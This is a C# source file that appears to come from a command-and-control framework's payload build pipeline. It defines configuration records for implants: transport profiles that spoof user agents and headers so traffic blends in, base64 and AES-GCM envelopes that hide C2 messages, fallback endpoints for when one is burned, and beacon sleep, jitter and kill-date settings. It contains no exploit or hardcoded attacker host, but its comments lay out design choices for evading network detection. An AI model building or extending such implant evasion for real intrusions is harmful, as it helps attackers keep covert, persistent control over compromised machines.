namespace Rod.BuildPipeline.PayloadBuild;

/// <summary>
/// How the enroll JSON body is shaped on the wire. <see cref="None"/> sends the
/// raw JSON document; <see cref="Base64"/> wraps it as a single base64 string so
/// the request body no longer looks like a structured C2 message -- a classic
/// malleable-transport transform (architecture.md Sec 7). <see cref="AesGcm"/>
/// goes further: the body is a single base64 string wrapping AES-256-GCM
/// ciphertext under a per-artifact key minted at build, so the request stays
/// opaque even where TLS terminates early (a redirector, a fronting CDN, a
/// hold of decrypted traffic). The teamserver-side enroll endpoint understands
/// every shape (it decodes the envelope before binding), so an
/// envelope-profiled implant enrolls against a stock deployment with no
/// unwrapping edge in front of it.
/// </summary>
public enum TransportEnvelope
{
    /// <summary>Send the enroll body as the raw JSON document.</summary>
    None = 0,

    /// <summary>Wrap the enroll JSON body as a single base64 string.</summary>
    Base64 = 1,

    /// <summary>
    /// Wrap the enroll JSON body as AES-256-GCM ciphertext (itself base64 in a
    /// JSON string) under the per-artifact envelope key the build mints, bakes
    /// into the artifact, and records beside the stored payload for the
    /// teamserver's own decode.
    /// </summary>
    AesGcm = 2,
}

/// <summary>
/// The malleable transport profile baked into an implant at generation
/// (architecture.md Sec 7, Sec 8): the C2 endpoint the implant dials plus the
/// URI, header, timing, and payload shape it speaks over the wire. Per-implant so
/// two implants do not look the same; a burned endpoint is replaceable because
/// the listener and the public endpoint are decoupled.
///
/// The positional <see cref="Endpoint"/> and <see cref="UriPath"/> are the
/// always-required fields; the malleable knobs default to values that leave the
/// wire shape unchanged, so a minimal build stays valid. The defaults are pinned
/// by <see cref="TransportProfile.Defaults"/> so the build units, the transport
/// endpoint, and the tests share one source of truth.
/// </summary>
public sealed record TransportProfile(
    string Endpoint,
    string UriPath)
{
    /// <summary>The enroll URI path, relative to the endpoint host. Defaults to
    /// <c>/implants/enroll</c>, the teamserver's fixed enroll route. A profile
    /// may set it to a malleable path the redirector rewrites to the real route
    ///; here it is baked in verbatim so two profiles can differ on it.</summary>
    public string EnrollPath { get; init; } = Defaults.EnrollPath;

    /// <summary>The <c>User-Agent</c> header the implant presents on enroll, so
    /// the request blends with legitimate traffic (architecture.md Sec 7).
    /// Empty leaves the HTTP client's default.</summary>
    public string UserAgent { get; init; } = Defaults.UserAgent;

    /// <summary>Extra HTTP headers applied to the enroll request, so a profile
    /// can match a known-good client shape (architecture.md Sec 7). Empty adds
    /// none.</summary>
    public IReadOnlyDictionary<string, string> Headers { get; init; } = Defaults.Headers;

    /// <summary>The per-request timeout for the enroll call. Defaults to 30s, the
    /// value the reference implant's enroll client already used.</summary>
    public TimeSpan RequestTimeout { get; init; } = Defaults.RequestTimeout;

    /// <summary>How the enroll JSON body is shaped on the wire
    /// (architecture.md Sec 7). Defaults to <see cref="TransportEnvelope.None"/>,
    /// leaving the body as raw JSON.</summary>
    public TransportEnvelope Envelope { get; init; } = Defaults.Envelope;

    /// <summary>
    /// Whether the artifact's check-in bodies seal under the per-artifact
    /// envelope key (architecture.md Sec 8/9): every envelope check-in POST
    /// and its response ride as AES-256-GCM ciphertext covering a fresh
    /// counter -- the application-layer authentication the web transports use
    /// instead of a TLS client certificate, and the confidentiality that lets
    /// the cleartext-http posture carry content. Defaults to
    /// <see cref="Defaults.CheckInProtection"/> (on); off is the lab-debug
    /// plaintext frame. Independent of <see cref="Envelope"/>, which shapes
    /// the enroll body only -- the two phases are two knobs.
    /// </summary>
    public bool CheckInProtection { get; init; } = Defaults.CheckInProtection;

    /// <summary>
    /// The ordered fallback egress endpoints baked in behind
    /// <see cref="Endpoint"/> (architecture.md Sec 8): when the primary burns
    /// mid-engagement, the implant walks this list on failed check-ins instead of
    /// going silent. The list is a property of the transport profile because each
    /// entry is another front to the same teamserver. Empty -- the default --
    /// bakes the single-endpoint shape.
    /// </summary>
    public IReadOnlyList<string> FallbackEndpoints { get; init; } = Defaults.FallbackEndpoints;

    /// <summary>
    /// The host the beacon stream dials, when it differs from the enroll
    /// endpoint (architecture.md Sec 8, the split-socket shape): enrollment is
    /// an anonymous token redemption an HTTP/1.x socket serves, while the
    /// beacon is gRPC (HTTP/2) and rides an mTLS-terminated socket -- Kestrel
    /// serves cleartext HTTP/2 only on an HTTP/2-only endpoint, so one
    /// cleartext listener cannot carry both halves. Null -- the default --
    /// derives the beacon host from <see cref="Endpoint"/>: the single-front
    /// shape where one https endpoint (typically a redirector's) serves
    /// enroll and beacon alike.
    /// </summary>
    public string? BeaconEndpoint { get; init; }

    /// <summary>
    /// The PEM-encoded teamserver CA pinned into the artifact, so the
    /// implant's first contact (enroll, before any certificate of its own)
    /// validates the server it dials against the C2's own CA rather than
    /// system roots -- the single-port https shape needs exactly this trust
    /// anchor, and every other shape gets server pinning for free. Null keeps
    /// the artifact on system/default validation.
    /// </summary>
    public string? CaPem { get; init; }

    /// <summary>
    /// The shared default values for the malleable knobs. Centralized so the
    /// transport endpoint, the build service, and the tests agree on what a
    /// "minimal" profile fills in.
    /// </summary>
    public static class Defaults
    {
        public const string EnrollPath = "/implants/enroll";
        public const string UserAgent = "";
        public static readonly IReadOnlyDictionary<string, string> Headers
            = new Dictionary<string, string>(StringComparer.Ordinal);
        public static readonly TimeSpan RequestTimeout = TimeSpan.FromSeconds(30);
        public const TransportEnvelope Envelope = TransportEnvelope.None;
        public const bool CheckInProtection = true;
        public static readonly IReadOnlyList<string> FallbackEndpoints = Array.Empty<string>();
    }
}

/// <summary>
/// The beacon profile baked into an implant at generation (architecture.md Sec 5.1,
/// Sec 7): the check-in mode, the sleep interval, the jitter applied to each
/// check-in, and the kill date past which the implant self-terminates. These are
/// embedded into the artifact at build time so each implant is self-contained.
/// </summary>
/// <param name="Mode">
/// How one check-in cycle uses the beacon stream: <c>stream</c> holds the
/// connection open (interactive, server-push tasking); <c>poll</c> drains
/// queued tasking, closes, and sleeps the interval -- the low-and-slow OPSEC
/// shape. Defaults to <c>stream</c>.
/// </param>
/// <param name="KillDate">
/// The self-termination timestamp, or null for an open-ended artifact: the
/// long-haul posture where the implant runs until it is retired or the
/// operator rebuilds it, with no time fuse at all.
/// </param>
public sealed record BeaconProfile(
    TimeSpan Sleep,
    TimeSpan Jitter,
    DateTimeOffset? KillDate,
    string Mode = "stream");

/// <summary>
/// The target the artifact is built for. Build params are produced at request
/// time so each artifact is unique (architecture.md Sec 6); the target OS/arch
/// selects the compilation target inside the build unit.
/// </summary>
public sealed record TargetProfile(
    string OperatingSystem,
    string Architecture);
